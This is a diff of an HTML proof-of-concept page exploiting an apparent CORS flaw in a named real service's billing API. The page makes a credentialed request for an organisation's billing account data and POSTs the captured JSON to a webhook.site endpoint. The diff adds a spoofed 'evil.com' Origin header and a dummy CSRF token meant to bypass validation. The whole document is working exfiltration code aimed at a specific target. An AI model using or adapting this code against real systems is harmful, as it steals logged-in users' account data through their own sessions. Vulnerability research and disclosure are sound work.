@@ -1,39 +1,46 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>PoC Exfiltration</title>
+  <meta charset="UTF-8">
+  <title>CORS Bug Test</title>
 </head>
 <body>
-  <h2>Exfiltrating data...</h2>
-  <pre id="output">Waiting...</pre>
+  <h1>CORS Bug PoC</h1>
+  <pre id="output">Waiting for data...</pre>
 
   <script>
-    async function exfiltrate() {
+    async function fetchData() {
+      const output = document.getElementById("output");
+
       try {
-        // Fetch data from the target (CORS vulnerable)
-        let response = await fetch("https://console.neon.tech/api/v2/organizations/org-round-lab-67110498/billing/account", {
+        // Target URL where you found the CORS issue
+        const targetUrl = "https://console.neon.tech/api/v2/organizations/org-round-lab-67110498/billing/account";
+
+        const response = await fetch(targetUrl, {
           method: "GET",
-          credentials: "include" // important: sends cookies/session
+          credentials: "include", // sends cookies/session
+          headers: {
+            "Origin": "https://evil.com",       // simulate attacker's origin
+            "X-Csrf-Token": "randomstring"     // bypass if CSRF isn't validated
+          }
         });
 
-        let data = await response.json();
-        document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+        const data = await response.json();
+        output.textContent = JSON.stringify(data, null, 2);
 
-        // Send data to your webhook
-        await fetch("https://webhook.site/1b41bc5c-4ca7-435a-b8be-7e42ded1d4f8", {
+        // Send captured data to your webhook
+        await fetch("https://webhook.site/YOUR-UNIQUE-ID", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
         });
 
       } catch (err) {
-        document.getElementById("output").textContent = "Error: " + err;
+        output.textContent = "Error: " + err;
       }
     }
 
-    exfiltrate();
+    fetchData();
   </script>
 </body>
 </html>
